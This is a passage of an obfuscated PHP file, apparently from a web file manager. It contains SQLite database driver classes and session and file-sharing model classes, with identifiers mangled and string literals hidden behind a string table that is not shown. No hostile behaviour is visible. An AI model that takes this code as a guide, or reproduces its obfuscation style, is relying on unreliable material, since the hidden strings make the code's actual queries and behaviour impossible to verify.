. sqlite_error_string($şüì¨ğ); if ($ÈÓãßå[12] != $this->queryStr) { $this->error .= LNG($ÈÓãßå[48]) . $this->queryStr; } think_trace($this->error, $ÈÓãßå[12], $ÈÓãßå[49]); return $this->error; } public function escapeString($ÜŒ¬ÕáĞ) { return sqlite_escape_string($ÜŒ¬ÕáĞ); } public function parseLimit($ä²û‹») { $€Å¡Ğğº =& $_SERVER[§ŒØóıü]; $ï†¤ñ–û = $€Å¡Ğğº[12]; if (!empty($ä²û‹»)) { $ä²û‹» = explode($€Å¡Ğğº[50], $ä²û‹»); if (count($ä²û‹») > 1) { $ï†¤ñ–û .= $€Å¡Ğğº[51] . $ä²û‹»[1] . $€Å¡Ğğº[52] . $ä²û‹»[0] . $€Å¡Ğğº[53]; } else { $ï†¤ñ–û .= $€Å¡Ğğº[51] . $ä²û‹»[0] . $€Å¡Ğğº[53]; } } return $ï†¤ñ–û; } } class DbSqlite3Base extends Db { public function __construct($Öˆ¾¸£ó = '') { $¶¬ˆÒÈ =& $_SERVER[§ŒØóıü]; if (!class_exists($¶¬ˆÒÈ[54])) { think_exception(think_lang($¶¬ˆÒÈ[14]) . $¶¬ˆÒÈ[55]); } if (!empty($Öˆ¾¸£ó)) { if (!isset($Öˆ¾¸£ó[$¶¬ˆÒÈ[16]])) { $Öˆ¾¸£ó[$¶¬ˆÒÈ[16]] = 438; } $this->config = $Öˆ¾¸£ó; if (empty($this->config[$¶¬ˆÒÈ[17]])) { $this->config[$¶¬ˆÒÈ[17]] = array(); } } } public function connect($ú“š¶úÃ = '', $’ñ¸íÈ = 0) { $Ç¶ù¹öì =& $_SERVER[§ŒØóıü]; if (!isset($this->linkID[$’ñ¸íÈ])) { if (empty($ú“š¶úÃ)) { $ú“š¶úÃ = $this->config; } $this->linkID[$’ñ¸íÈ] = new SQLite3($ú“š¶úÃ[$Ç¶ù¹öì[21]]); if (!$this->linkID[$’ñ¸íÈ]) { think_exception($this->linkID[$’ñ¸íÈ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$’ñ¸íÈ]->busyTimeout(30000); if (1 != think_config($Ç¶ù¹öì[22])) { unset($this->config); } } return $this->linkID[$’ñ¸íÈ]; } public function free() { $this->queryID = null; } public function query($ƒ½ì£µÓ) { $×»ª´ =& $_SERVER[§ŒØóıü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ƒ½ì£µÓ; if ($this->queryID) { $this->free(); } think_action_status($×»ª´[23], 1); think_status($×»ª´[24]); $this->queryID = $this->_linkID->query($ƒ½ì£µÓ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ñã¹”Æô = $this->getAll(); $this->numRows = count($Ñã¹”Æô); return $Ñã¹”Æô; } } public function execute($™Ë¤†í·) { $Şºš÷ı· =& $_SERVER[§ŒØóıü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $™Ë¤†í·; if ($this->queryID) { $this->free(); } think_action_status($Şºš÷ı·[25], 1); think_status($Şºš÷ı·[24]); $œÖ‘ŞŸñ = $this->_linkID->exec($™Ë¤†í·); $this->debug(); if (!1 === $œÖ‘ŞŸñ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[§ŒØóıü][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ê¥¡Ñ™ı = $this->_linkID->query($_SERVER[§ŒØóıü][27]); if (!$ê¥¡Ñ™ı) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Îï”­ºÄ = $this->_linkID->query($_SERVER[§ŒØóıü][28]); if (!$Îï”­ºÄ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $â·ñ³“£ = array(); while ($ÎÖÍÈ™Š = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $â·ñ³“£[] = $ÎÖÍÈ™Š; } $this->queryID->reset(); return $â·ñ³“£; } public function getFields($õ°½–ÆÈ) { $ÜÊ—¤ =& $_SERVER[§ŒØóıü]; $ÈÎú•Ò = $this->query($ÜÊ—¤[29] . $õ°½–ÆÈ . $ÜÊ—¤[30]); $Ó¦Ğ¿ô© = array(); if ($ÈÎú•Ò) { foreach ($ÈÎú•Ò as $Ïì—ğ”Ş => $ãÑü˜ğ) { $Ó¦Ğ¿ô©[$ãÑü˜ğ[$ÜÊ—¤[32]]] = array($ÜÊ—¤[32] => $ãÑü˜ğ[$ÜÊ—¤[32]], $ÜÊ—¤[33] => $ãÑü˜ğ[$ÜÊ—¤[33]], $ÜÊ—¤[35] => (bool) ($ãÑü˜ğ[$ÜÊ—¤[35]] === $ÜÊ—¤[12]), $ÜÊ—¤[37] => $ãÑü˜ğ[$ÜÊ—¤[56]], $ÜÊ—¤[39] => (bool) $ãÑü˜ğ[$ÜÊ—¤[57]], $ÜÊ—¤[42] => (bool) $ãÑü˜ğ[$ÜÊ—¤[57]]); } } return $Ó¦Ğ¿ô©; } public function getTables($ŞÚ«–ä« = '') { $ÒÊ²¬¯ =& $_SERVER[§ŒØóıü]; $àß€ç™ = $this->query($ÒÊ²¬¯[45] . $ÒÊ²¬¯[46] . $ÒÊ²¬¯[47]); $ÌßÕ¾˜³ = array(); foreach ($àß€ç™ as $½‹ı‡†ı => $¸àÈÕÖ‡) { $ÌßÕ¾˜³[$½‹ı‡†ı] = current($¸àÈÕÖ‡); } return $ÌßÕ¾˜³; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¢«¨À‹Ç =& $_SERVER[§ŒØóıü]; $this->error = $this->_linkID->lastErrorMsg(); if ($¢«¨À‹Ç[12] != $this->queryStr) { $this->error .= LNG($¢«¨À‹Ç[48]) . $this->queryStr; } think_trace($this->error, $¢«¨À‹Ç[12], $¢«¨À‹Ç[49]); return $this->error; } public function escapeString($®ÀŞ‘Ï³) { $ñ¯¶¿Å¾ =& $_SERVER[§ŒØóıü]; if ($this->_linkID) { return $this->_linkID->escapeString($®ÀŞ‘Ï³); } return str_ireplace($ñ¯¶¿Å¾[58], $ñ¯¶¿Å¾[59], $®ÀŞ‘Ï³); } public function parseLimit($€¤ØŠ™Ê) { $‰ãòÎú =& $_SERVER[§ŒØóıü]; $è›‘òÑœ = $‰ãòÎú[12]; if (!empty($€¤ØŠ™Ê)) { $€¤ØŠ™Ê = explode($‰ãòÎú[50], $€¤ØŠ™Ê); if (count($€¤ØŠ™Ê) > 1) { $è›‘òÑœ .= $‰ãòÎú[51] . $€¤ØŠ™Ê[1] . $‰ãòÎú[52] . $€¤ØŠ™Ê[0] . $‰ãòÎú[53]; } else { $è›‘òÑœ .= $‰ãòÎú[51] . $€¤ØŠ™Ê[0] . $‰ãòÎú[53]; } } return $è›‘òÑœ; } } goto f³ç‡øğù; c¬¤äÔç£„: class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\155\x5f\163\145\x73\x73\151\x6f\156"; public function get($÷ğ¡Œı) { $÷“ÓèÖ =& $_SERVER[§ŒØóıü]; $ºı”˜Šô = $this->where(array($÷“ÓèÖ[1997] => $÷ğ¡Œı))->find(); if (!is_array($ºı”˜Šô)) { return !1; } return $ºı”˜Šô[$÷“ÓèÖ[760]]; } public function set($‚ôàû«ë, $Š€Á£ë, $†Ì‡´·Ä = 3600) { $Ãâ•ß‘È =& $_SERVER[§ŒØóıü]; $óÊıÙÂÓ = array($Ãâ•ß‘È[1997] => $‚ôàû«ë, $Ãâ•ß‘È[1901] => $Š€Á£ë, $Ãâ•ß‘È[1998] => $†Ì‡´·Ä + time()); if (Session::get($Ãâ•ß‘È[1999])) { $óÊıÙÂÓ[$Ãâ•ß‘È[1673]] = Session::get($Ãâ•ß‘È[1999]); } else { $óÊıÙÂÓ[$Ãâ•ß‘È[1673]] = 0; } if ($this->get($‚ôàû«ë)) { return $this->where(array($Ãâ•ß‘È[1997] => $‚ôàû«ë))->save($óÊıÙÂÓ); } else { return $this->add($óÊıÙÂÓ, array(), !0); } } public function remove($ìáˆ¯Ë¨) { return $this->where(array($_SERVER[§ŒØóıü][1997] => $ìáˆ¯Ë¨))->delete(); } public function clearTimeout() { return $this->where($_SERVER[§ŒØóıü][2000] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\x72\145"; protected $dataAuto = array(array("\x6d\x6f\144\151\146\171\124\x69\x6d\x65", "\x74\151\x6d\145", "\x69\x6e\x73\x65\162\x74\54\x75\160\x64\x61\x74\145", "\x66\165\156\143\164\x69\157\156"), array("\143\x72\x65\x61\164\x65\124\x69\x6d\145", "\164\151\x6d\x65", "\151\156\163\145\x72\x74", "\146\165\156\x63\x74\x69\x6f\156"), array("\157\160\164\151\x6f\x6e\x73", '', "\x69\156\163\145\162\x74\x2c\165\160\144\141\164\145\x2c\163\145\x6c\x65\x63\x74", "\x6a\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ãÂ‰Ë) { $¤µ¼ûĞ =& $_SERVER[§ŒØóıü]; $É–ÂÖ© = isset($ãÂ‰Ë[0]) ? $ãÂ‰Ë[0] : !1; return array($¤µ¼ûĞ[2001] => array(USER_ID, $¤µ¼ûĞ[2002]), $¤µ¼ûĞ[1942] => array($É–ÂÖ©, $¤µ¼ûĞ[2003])); } protected function listSimple() { $®º×ĞÓ = array($_SERVER[§ŒØóıü][1673] => USER_ID); $˜ĞöÅ›Î = $this->field($this->fieldList)->where($®º×ĞÓ)->select(); return $˜ĞöÅ›Î ? $˜ĞöÅ›Î : array(); } protected function getInfo($Ù¯õÕ”ï, $—üˆŸäò = false) { $ÁÑŠ‹å =& $_SERVER[§ŒØóıü]; if ($—üˆŸäò) { return $this->_getShareInfo(array($ÁÑŠ‹å[593] => $Ù¯õÕ”ï)); } $´ÉœŸâú = $this->cacheFunctionGet($ÁÑŠ‹å[1944], $Ù¯õÕ”ï); return $´ÉœŸâú; } public function getInfoByHash($¾Á¤²¦è) { return $this->_getShareInfo(array($_SERVER[§ŒØóıü][2004] => $¾Á¤²¦è)); } public function getInfoByPath($Ş¾Ëª½“) { $Ä×—Ë‡³ =& $_SERVER[§ŒØóıü]; $‘‘şĞÁ÷ = array($Ä×—Ë‡³[1673] => USER_ID, $Ä×—Ë‡³[402] => $Ş¾Ëª½“); return $this->_getShareInfo($‘‘şĞÁ÷); } public function getInfoBySourcePath($²äÑ­Ñà) { $±ğ˜˜®ª =& $_SERVER[§ŒØóıü]; $ãÑ’óıÕ = array($±ğ˜˜®ª[1673] => USER_ID, $±ğ˜˜®ª[1181] => $²äÑ­Ñà); return $this->_getShareInfo($ãÑ’óıÕ); } private function _getShareInfo($´›”†Œ¼) { $¡œ•‘ƒ  =& $_SERVER[§ŒØóıü]; $‚ œÕòô = $this->where($´›”†Œ¼)->find(); if (!$‚ œÕòô) { return !1; } $´›”†Œ¼ = array($¡œ•‘ƒ [593] => $‚ œÕòô[$¡œ•‘ƒ [593]]); $¹ôØÈ  = $¡œ•‘ƒ [2005]; $õ©Î±Ù® = Model($¡œ•‘ƒ [594])->order($¡œ•‘ƒ [399])->field($¹ôØÈ )->where($´›”†Œ¼)->select(); if ($‚ œÕòô[$¡œ•‘ƒ [402]] == $¡œ•‘ƒ [198]) { $‚ œÕòô[$¡œ•‘ƒ [87]] = IO::info($‚ œÕòô[$¡œ•‘ƒ [1181]]); } else { $‚ œÕòô[$¡œ•‘ƒ [87]] = Model($¡œ•‘ƒ [1345])->pathInfo($‚ œÕòô[$¡œ•‘ƒ [402]]); } $‚ œÕòô[$¡œ•‘ƒ [2006]] = $õ©Î±Ù®; return $‚ œÕòô; } protected function getInfoAuth($‹Ç¿»è) { $¢ù®´­½ =& $_SERVER[§ŒØóıü]; $­’£ÛøÑ = $this->getInfo($‹Ç¿»è); if ($­’£ÛøÑ[$¢ù®´­½[1673]] == USER_ID) { $­’£ÛøÑ[$¢ù®´­½[413]] = $­’£ÛøÑ[$¢ù®´­½[87]][$¢ù®´­½[413]]; } else { $­’£ÛøÑ[$¢ù®´­½[413]] = Model($¢ù®´­½[493])->authMake($­’£ÛøÑ[$¢ù®´­½[2006]]); } return $­’£ÛøÑ; } protected function listData($Õ–´†öƒ = null, $Šåî£Î‡ = 300) { $ Ãäµíş =& $_SERVER[§ŒØóıü]; $´Ù“Œü¸ = array(array($ Ãäµíş[488] => array($ Ãäµíş[1018], 0), $ Ãäµíş[591] => array($ Ãäµíş[1018], 0), $ Ãäµíş[2007] => $ Ãäµíş[1960])); if ($Õ–´†öƒ == $ Ãäµíş[2008]) { $´Ù“Œü¸ = array($ Ãäµíş[488] => 1); } else { if ($Õ–´†öƒ == $ Ãäµíş[1167]) { $´Ù“Œü¸ = array($ Ãäµíş[591] => 1); } } $´Ù“Œü¸[$ Ãäµíş[1673]] = USER_ID; $Ç—ÌÁä = $this->where($´Ù“Œü¸)->selectPage($Šåî£Î‡); return $Ç—ÌÁä; } protected function listToMe($òğÇÔï = 300) { $¢æ¥ÙˆÆ =& $_SERVER[§ŒØóıü]; $¿İ¬â©— = Model($¢æ¥ÙˆÆ[2009])->userGroupParents(USER_ID); $ïó•ĞÏô = array($¢æ¥ÙˆÆ[576] => SourceModel::TYPE_USER, $¢æ¥ÙˆÆ[496] => USER_ID); if ($¿İ¬â©—) { $ïó•ĞÏô = array(array($¢æ¥ÙˆÆ[576] => SourceModel::TYPE_USER, $¢æ¥ÙˆÆ[496] => USER_ID), array($¢æ¥ÙˆÆ[576] => SourceModel::TYPE_GROUP, $¢æ¥ÙˆÆ[496] => array($¢æ¥ÙˆÆ[7], $¿İ¬â©—)), $¢æ¥ÙˆÆ[2007] => $¢æ¥ÙˆÆ[1960]); } $ñà°¿ï = Model($¢æ¥ÙˆÆ[594])->where($ïó•ĞÏô)->selectPage($òğÇÔï); $¦÷€×ÓÈ = array_to_keyvalue_group($ñà°¿ï[$¢æ¥ÙˆÆ[369]], $¢æ¥ÙˆÆ[593]); if (!$¦÷€×ÓÈ) { return $ñà°¿ï; } $İà˜‰Ïƒ = $¢æ¥ÙˆÆ[2010]; $ïó•ĞÏô = array($¢æ¥ÙˆÆ[593] => array($¢æ¥ÙˆÆ[418], array_keys($¦÷€×ÓÈ)), $¢æ¥ÙˆÆ[1673] => array($¢æ¥ÙˆÆ[1020], $¢æ¥ÙˆÆ[198])); $ù€íÉ» = $this->field($İà˜‰Ïƒ)->where($ïó•ĞÏô)->select(); foreach ($ù€íÉ» as $ÍşĞ›µ” => &$õŸœ¾‡³) { $õŸœ¾‡³[$¢æ¥ÙˆÆ[2006]] = $¦÷€×ÓÈ[$õŸœ¾‡³[$¢æ¥ÙˆÆ[593]]]; } unset($õŸœ¾‡³); $Æ­İ‘šæ = array($¢æ¥ÙˆÆ[2011] => $ù€íÉ», $¢æ¥ÙˆÆ[2012] => $ñà°¿ï[$¢æ¥ÙˆÆ[366]]); return $Æ­İ‘šæ; } protected function shareAdd($Êëå¤úÏ, $Õ‰­¶Ö) { $¸ÛÆƒ¾À =& $_SERVER[§ŒØóıü]; $áÙ»ˆ³ = $this->_addShareData($Êëå¤úÏ, $Õ‰­¶Ö); if (!empty($Õ‰­¶Ö[$¸ÛÆƒ¾À[2013]])) { $this->_shareAuthSet($áÙ»ˆ³, $Õ‰­¶Ö[$¸ÛÆƒ¾À[2013]]); } $this->shareEventAdd($Êëå¤úÏ, $Õ‰­¶Ö, $¸ÛÆƒ¾À[2014]); return $áÙ»ˆ³; } protected function shareAddSystem($â¤ùŸç•, $÷’–˜—) { $ÆÛŠ´Ò =& $_SERVER[§ŒØóıü]; $£úÚúğ = $this->_addShareData($â¤ùŸç•, $÷’–˜—, $ÆÛŠ´Ò[1290]); $this->_shareAuthSet($£úÚúğ, $÷’–˜—[$ÆÛŠ´Ò[2013]]); return $£úÚúğ; } private function shareEventAdd($ë‹–™…Ç, $«î•õ¿ó, $º¦—‰ğ = "\x61\144\x64") { $î˜êšÌÕ =& $_SERVER[§ŒØóıü]; if (!$ë‹–™…Ç || $ë‹–™…Ç == $î˜êšÌÕ[198]) { return; } if ($º¦—‰ğ == $î˜êšÌÕ[2014]) { if ($«î•õ¿ó[$î˜êšÌÕ[488]] == $î˜êšÌÕ[88]) { Model($î˜êšÌÕ[561])->eventShare($ë‹–™…Ç, $î˜êšÌÕ[2015]); } if ($«î•õ¿ó[$î˜êšÌÕ[591]] == $î˜êšÌÕ[88]) { Model($î˜êšÌÕ[561])->eventShare($ë‹–™…Ç, $î˜êšÌÕ[2016]); } return; } $Å§ÛŞ¾³ = $this->getInfoByPath($ë‹–™…Ç); $çÅ„À¨Ñ = $î˜êšÌÕ[2017]; if ($Å§ÛŞ¾³[$î˜êšÌÕ[488]] == $î˜êšÌÕ[198] && $«î•õ¿ó[$î˜êšÌÕ[488]] == $î˜êšÌÕ[88]) { $çÅ„À¨Ñ = $î˜êšÌÕ[2015]; } if ($Å§ÛŞ¾³[$î˜êšÌÕ[488]] == $î˜êšÌÕ[88] && $«î•õ¿ó[$î˜êšÌÕ[488]] == $î˜êšÌÕ[198]) { $çÅ„À¨Ñ = $î˜êšÌÕ[2018]; } if ($Å§ÛŞ¾³[$î˜êšÌÕ[591]] == $î˜êšÌÕ[198] && $«î•õ¿ó[$î˜êšÌÕ[591]] == $î˜êšÌÕ[88]) { $çÅ„À¨Ñ = $î˜êšÌÕ[2016]; } if ($Å§ÛŞ¾³[$î˜êšÌÕ[591]] == $î˜êšÌÕ[88] && $«î•õ¿ó[$î˜êšÌÕ[591]] == $î˜êšÌÕ[198]) { $çÅ„À¨Ñ = $î˜êšÌÕ[2019]; } Model($î˜êšÌÕ[561])->eventShare($ë‹–™…Ç, $çÅ„À¨Ñ); return; } private function _addShareData($òÏ§†‚, $Ü—™§ğ = array(), $ÊµÓ­Ÿ‰ = false) { $«ÖğìÁØ =& $_SERVER[§ŒØóıü]; $ô˜—­»ˆ = $ÊµÓ­Ÿ‰ == $«ÖğìÁØ[1290] ? 0 : USER_ID; $¹°ì°¸ = array($«ÖğìÁØ[417] => $òÏ§†‚, $«ÖğìÁØ[1664] => $ô˜—­»ˆ); if ($òÏ§†‚ == 0) { $¹°ì°¸ = array($«ÖğìÁØ[2020] => $Ü—™§ğ[$«ÖğìÁØ[1181]], $«ÖğìÁØ[1664] => $ô˜—­»ˆ); } if ($Îˆòëª÷ = $this->where($¹°ì°¸)->find()) { return $Îˆòëª÷[$«ÖğìÁØ[593]]; } if ($òÏ§†‚ == 0) { $åçËã = array($«ÖğìÁØ[32] => get_path_this($Ü—™§ğ[$«ÖğìÁØ[84]])); } else { $åçËã = Model($«ÖğìÁØ[831])->sourceInfo($òÏ§†‚); if (!$åçËã) { return !1; } } if (!$Ü—™§ğ[$«ÖğìÁØ[1573]]) { $Ü—™§ğ[$«ÖğìÁØ[1573]] = $åçËã[$«ÖğìÁØ[32]]; } $å­âÎš€ = array($«ÖğìÁØ[1664] => $ô˜—­»ˆ, $«ÖğìÁØ[417] => $òÏ§†‚, $«ÖğìÁØ[1573] => $«ÖğìÁØ[12], $«ÖğìÁØ[488] => 0, $«ÖğìÁØ[591] => 0, $«ÖğìÁØ[1181] => $«ÖğìÁØ[12], $«ÖğìÁØ[307] => $«ÖğìÁØ[12], $«ÖğìÁØ[895] => $«ÖğìÁØ[12], $«ÖğìÁØ[2021] => 0, $«ÖğìÁØ[2022] => 0, $«ÖğìÁØ[767] => 0, $«ÖğìÁØ[2023] => $«ÖğìÁØ[12], $«ÖğìÁØ[2004] => $«ÖğìÁØ[12]); $¯‰Á‰áã = explode($«ÖğìÁØ[50], $«ÖğìÁØ[2024]); foreach ($¯‰Á‰áã as $ÆÈ¤’Õ) { if (!isset($Ü—™§ğ[$ÆÈ¤’Õ])) { continue; } $å­âÎš€[$ÆÈ¤’Õ] = $Ü—™§ğ[$ÆÈ¤’Õ]; } $™õŸÇ¡Ğ = $this->add($å­âÎš€); $‘Ç€¢‚ = array($«ÖğìÁØ[2004] => short_id($™õŸÇ¡Ğ)); $this->where(array($«ÖğìÁØ[2025] => $™õŸÇ¡Ğ))->save($‘Ç€¢‚); return $™õŸÇ¡Ğ; } private function _shareAuthSet($Òõ¬Şä¨, $óöóù‚Ê) { $­¯àƒ¸€ =& $_SERVER[§ŒØóıü]; if (!is_array($óöóù‚Ê)) { return !1; } $Ã‡´¾°ı = Model($­¯àƒ¸€[1970]); $Ã‡´¾°ı->where(array($­¯àƒ¸€[593] => $Òõ¬Şä¨))->delete(); $¬©ƒÉŞ° = array(); foreach ($óöóù‚Ê as $÷“¦¹¤Ğ) { $×“ÉÄ÷õ = SourceModel::TYPE_USER; if ($÷“¦¹¤Ğ[$­¯àƒ¸€[411]] == SourceModel::TYPE_GROUP) { $×“ÉÄ÷õ = SourceModel::TYPE_GROUP; } $ÅÆöºİ¾ = array($­¯àƒ¸€[593] => $Òõ¬Şä¨, $­¯àƒ¸€[411] => $×“ÉÄ÷õ, $­¯àƒ¸€[496] => intval($÷“¦¹¤Ğ[$­¯àƒ¸€[496]]), $­¯àƒ¸€[1966] => 0, $­¯àƒ¸€[2026] => -1); if ($÷“¦¹¤Ğ[$­¯àƒ¸€[1966]]) { $ÅÆöºİ¾[$­¯àƒ¸€[1966]] = $÷“¦¹¤Ğ[$­¯àƒ¸€[1966]]; } else { if ($÷“¦¹¤Ğ[$­¯àƒ¸€[2026]]) { $ÅÆöºİ¾[$­¯àƒ¸€[2026]] = $÷“¦¹¤Ğ[$­¯àƒ¸€[2026]]; } } $¬©ƒÉŞ°[] = $ÅÆöºİ¾; } return $Ã‡´¾°ı->addAll($¬©ƒÉŞ°, array(), !0); } public function numViewAdd($³ìéËÔè) { $ØŞ€Ë’¢ =& $_SERVER[§ŒØóıü]; $Ô…À‰ğİ = array($ØŞ€Ë’¢[2025] => $³ìéËÔè); $this->where($Ô…À‰ğİ)->setAdd($ØŞ€Ë’¢[2021]); } public function numDownloadAdd($·ÉçËÌ°) { $ö¼âïÎÏ =& $_SERVER[§ŒØóıü]; $ÁÉÛ‚Î = array($ö¼âïÎÏ[2025] => $·ÉçËÌ°); $this->where($ÁÉÛ‚Î)->setAdd($ö¼âïÎÏ[2022]); } protected function shareEdit($ˆªê“Ö·, $«ø¹ıì§) { $°íÇğñ‚ =& $_SERVER[§ŒØóıü]; $ïÉóŞµŠ = $this->getInfo($ˆªê“Ö·); if (!$ïÉóŞµŠ) { return !1; } $this->_checkLinkShare($«ø¹ıì§, $ïÉóŞµŠ); $„¢±ŸÍ = array(); $˜¾¦û¡Ó = explode($°íÇğñ‚[50], $°íÇğñ‚[2027]); foreach ($˜¾¦û¡Ó as $®Á¿óã¨) { if (!array_key_exists($®Á¿óã¨, $«ø¹ıì§)) { continue; } $„¢±ŸÍ[$®Á¿óã¨] = $«ø¹ıì§[$®Á¿óã¨]; } $this->shareEventAdd($ïÉóŞµŠ[$°íÇğñ‚[402]], $«ø¹ıì§, $°íÇğñ‚[1832]); $this->where(array($°íÇğñ‚[2025] => $ˆªê“Ö·))->save($„¢±ŸÍ); if (isset($«ø¹ıì§[$°íÇğñ‚[2013]])) { $this->_shareAuthSet($ˆªê“Ö·, $«ø¹ıì§[$°íÇğñ‚[2013]]); } return !0; } private function _checkLinkShare($©¦½„Ôã, $ğÉÚ™¸§) { $®•ØçêÀ =& $_SERVER[§ŒØóıü]; if ($©¦½„Ôã[$®•ØçêÀ[488]] != $®•ØçêÀ[88]) { return; } $›¢¤æ‘ = $ğÉÚ™¸§[$®•ØçêÀ[87]][$®•ØçêÀ[402]]; if ($ğÉÚ™¸§[$®•ØçêÀ[87]][$®•ØçêÀ[33]] != $®•ØçêÀ[200]) { $Á‡§Å¥ª = $this->_folderReport($›¢¤æ‘); if (!$Á‡§Å¥ª) { return; } show_json(LNG($®•ØçêÀ[2028]) . $®•ØçêÀ[2029] . $Á‡§Å¥ª, !1); } $øí¿Æ½° = Model($®•ØçêÀ[831])->fileInfoGet($ğÉÚ™¸§[$®•ØçêÀ[87]][$®•ØçêÀ[402]]); if (!$øí¿Æ½°) { return; } $İÌ‡ğŸõ = $this->shareFileMeta($øí¿Æ½°[$®•ØçêÀ[468]]); if (isset($İÌ‡ğŸõ[$®•ØçêÀ[374]]) && $İÌ‡ğŸõ[$®•ØçêÀ[374]] == $®•ØçêÀ[88]) { show_json(LNG($®•ØçêÀ[2030]), !1); } } private function _folderReport($­¨€‹ù) { $¿ÀïÕ­¤ =& $_SERVER[§ŒØóıü]; $”¼Í³¹± = array($¿ÀïÕ­¤[468] => array($¿ÀïÕ­¤[1018], 0), $¿ÀïÕ­¤[755] => 3); $Ì‘â€³Ì = Model($¿ÀïÕ­¤[2031])->where($”¼Í³¹±)->field($¿ÀïÕ­¤[468])->select(); if (!$Ì‘â€³Ì) { return !1; } $Ì‘â€³Ì = array_to_keyvalue($Ì‘â€³Ì, $¿ÀïÕ­¤[12], $¿ÀïÕ­¤[468]); $¯„ş” = $¿ÀïÕ­¤[50] . $­¨€‹ù . $¿ÀïÕ­¤[50]; $”¼Í³¹± = array($¿ÀïÕ­¤[468] => array($¿ÀïÕ­¤[7], $Ì‘â€³Ì), $¿ÀïÕ­¤[511] => array($¿ÀïÕ­¤[383], "\45{$¯„ş”}\45"), $¿ÀïÕ­¤[431] => 0); $Ù÷øĞ€º = Model($¿ÀïÕ­¤[831])->where($”¼Í³¹±)->field($¿ÀïÕ­¤[2032])->find(); if (!$Ù÷øĞ€º) { return !1; } $×Ó¾õ¢õ = substr($Ù÷øĞ€º[$¿ÀïÕ­¤[511]], strpos($Ù÷øĞ€º[$¿ÀïÕ­¤[511]], $¯„ş”)); $”¼Í³¹± = array($¿ÀïÕ­¤[402] => array($¿ÀïÕ­¤[7], trim($×Ó¾õ¢õ, $¿ÀïÕ­¤[50]))); $Í€ª®¸ç = Model($¿ÀïÕ­¤[831])->where($”¼Í³¹±)->field($¿ÀïÕ­¤[32])->select(); $ÙŸ¢÷¿ = array_to_keyvalue($Í€ª®¸ç, $¿ÀïÕ­¤[12], $¿ÀïÕ­¤[32]); $ÙŸ¢÷¿[] = $Ù÷øĞ€º[$¿ÀïÕ­¤[32]]; return implode($¿ÀïÕ­¤[8], $ÙŸ¢÷¿); } protected function remove($üÚ¶éş›) { $éÀ€È² =& $_SERVER[§ŒØóıü]; if (is_array($üÚ¶éş›)) { $üÚ¶éş› = array($éÀ€È²[7], $üÚ¶éş›); } $¹é¨È¦Œ = array($éÀ€È²[593] => $üÚ¶éş›); $å§¯…«ñ = $this->where($¹é¨È¦Œ)->delete(); if ($å§¯…«ñ) { Model($éÀ€È²[594])->where(array($éÀ€È²[593] => $üÚ¶éş›))->delete(); } $ª­ÌÚÔ = is_array($üÚ¶éş›) ? $üÚ¶éş›[1] : array($üÚ¶éş›); for ($Ş‹”Íò” = 0; $Ş‹”Íò” < count($ª­ÌÚÔ); $Ş‹”Íò”++) { $ú—óŸÀÃ = $this->getInfo($ª­ÌÚÔ[$Ş‹”Íò”]); if ($ú—óŸÀÃ[$éÀ€È²[591]] == $éÀ€È²[88]) { Model($éÀ€È²[561])->eventShare($ú—óŸÀÃ[$éÀ€È²[402]], $éÀ€È²[2019]); } if ($ú—óŸÀÃ[$éÀ€È²[488]] == $éÀ€È²[88]) { Model($éÀ€È²[561])->eventShare($ú—óŸÀÃ[$éÀ€È²[402]], $éÀ€È²[2018]); } } return $å§¯…«ñ; } protected function removeBySource($˜¼şÆğ¬) { $±˜ê…ØÛ =& $_SERVER[§ŒØóıü]; $úøîëõô = array($±˜ê…ØÛ[417] => array($±˜ê…ØÛ[418], $˜¼şÆğ¬)); $ğ„™š¸Ñ = $this->field($±˜ê…ØÛ[593])->where($úøîëõô)->select(); $ğ„™š¸Ñ = array_to_keyvalue($ğ„™š¸Ñ, $±˜ê…ØÛ[12], $±˜ê…ØÛ[593]); if (!$ğ„™š¸Ñ) { return; } $úøîëõô = array($±˜ê…ØÛ[2025] => array($±˜ê…ØÛ[418], $ğ„™š¸Ñ)); $this->where($úøîëõô)->delete(); Model($±˜ê…ØÛ[594])->where($úøîëõô)->delete(); } public function listAll($¦’­¢Àî) { $ÚÜõáæ =& $_SERVER[§ŒØóıü]; $ø´…Àå = array(); if ($¦’­¢Àî[$ÚÜõáæ[1673]]) { $ø´…Àå[$ÚÜõáæ[1673]] = $¦’­¢Àî[$ÚÜõáæ[1673]]; } if ($¦’­¢Àî[$ÚÜõáæ[766]]) { $¦–öËÒ˜ = $¦’­¢Àî[$ÚÜõáæ[767]] ? $¦’­¢Àî[$ÚÜõáæ[767]] : strtotime(date($ÚÜõáæ[2033])); $ø´…Àå[$ÚÜõáæ[201]] = array($ÚÜõáæ[333], array($¦’­¢Àî[$ÚÜõáæ[766]], $¦–öËÒ˜)); } if ($¦’­¢Àî[$ÚÜõáæ[33]]) { $ø´…Àå[$¦’­¢Àî[$ÚÜõáæ[33]]] = 1; } else { $ø´…Àå[] = array($ÚÜõáæ[488] => array($ÚÜõáæ[1018], 0), $ÚÜõáæ[591] => array($ÚÜõáæ[1018], 0), $ÚÜõáæ[2007] => $ÚÜõáæ[1960]); } if ($¦’­¢Àî[$ÚÜõáæ[1956]]) { $ø´…Àå[] = array($ÚÜõáæ[2004] => $¦’­¢Àî[$ÚÜõáæ[1956]], $ÚÜõáæ[1573] => array($ÚÜõáæ[383], "\x25{$¦’­¢Àî[$ÚÜõáæ[1956]]}\x25"), $ÚÜõáæ[2007] => $ÚÜõáæ[1960]); } $Ò¤€“óú = $this->_makeOrder()->where($ø´…Àå)->selectPage(20); if 